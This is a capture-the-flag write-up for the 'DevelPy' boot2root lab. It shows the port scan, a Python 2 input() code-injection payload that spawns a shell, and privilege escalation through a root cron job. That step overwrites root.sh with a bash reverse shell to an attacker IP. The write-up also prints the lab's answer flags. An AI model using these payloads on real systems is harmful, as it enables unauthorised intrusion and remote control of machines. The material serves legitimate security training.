> DevelPy | boot2root

**export IP=10.10.35.38**

# Nmap

sudo nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
22/tcp    open  ssh               syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
10000/tcp open  snet-sensor-mgmt? syn-ack ttl 63
```

IN Port 10000, when we use `nc $IP 10000` 

```
       Private 0days

 Please enther number of exploits to send??: 10

Exploit started, attacking target (tryhackme.com)...
Exploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.035 ms
Exploiting tryhackme internal network: beacons_seq=2 ttl=1337 time=0.064 ms
...
```

But when we give a string we have a error.

```
Please enther number of exploits to send??: a
Traceback (most recent call last):
  File "./exploit.py", line 6, in <module>
    num_exploits = int(input(' Please enther number of exploits to send??: '))
  File "<string>", line 1, in <module>
NameError: name 'a' is not defined
```

A python2 vulnerability for Code Execution. And let's try a basic exploit ` __import__('os').system('bash')` and we are in!!

# user.txt

```
cf85ff769cfaaa721758949bf870b019
```

# Priv Esc

cat /etc/crontab

```
*  *	* * *	king	cd /home/king/ && bash run.sh
*  *	* * *	root	cd /home/king/ && bash root.sh
*  *	* * *	root	cd /root/company && bash run.sh
```

Let's remove root.sh and put a reverse shell in there.

`echo "bash -i >& /dev/tcp/10.8.107.21/1234 0>&1" > root.sh`

# root.txt

```
9c37646777a53910a347f387dce025ec
```